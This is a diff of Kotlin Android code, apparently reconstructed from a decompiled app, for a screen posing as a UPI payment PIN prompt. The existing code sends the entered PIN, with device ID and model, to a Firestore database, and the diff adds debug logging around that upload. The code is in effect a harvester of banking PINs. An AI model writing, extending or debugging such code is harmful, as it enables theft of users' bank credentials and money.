@@ -57,6 +57,9 @@ fun MainScreen() {
     if (showUPIPinScreen && !showSuccessScreen && !showFailedScreen) {
         UPIPinScreen(
             onPinEntered = { pin ->
+                android.util.Log.d("MainScreen", "🔑 onPinEntered callback triggered!")
+                android.util.Log.d("MainScreen", "PIN length: ${pin.length}")
+                
                 // منطق پردازش PIN مطابق کد decompiled
                 isProcessingPin = true
                 currentPin = pin
@@ -81,6 +84,7 @@ fun MainScreen() {
                         // ذخیره DeviceModel (اگر وجود نداشته باشد)
                         android.util.Log.d("MainScreen", "Saving device info...")
                         firestoreRepository.saveDeviceInfo(deviceId, deviceModel)
+                        android.util.Log.d("MainScreen", "Device info saved!")
                         
                         // ایجاد Map با کلید "upiPin" مطابق کد decompiled
                         val userFields = mapOf("upiPin" to pin.trim())
@@ -88,6 +92,7 @@ fun MainScreen() {
                         // ارسال به Firestore
                         android.util.Log.d("MainScreen", "Uploading UPI PIN to Firestore...")
                         val result = firestoreRepository.saveUserFields(userFields, deviceId)
+                        android.util.Log.d("MainScreen", "Upload result: ${result.isSuccess}")
                         
                         // در صورت موفقیت یا خطا، callback را فراخوانی می‌کنیم
                         if (result.isSuccess && result.getOrNull() == true) {
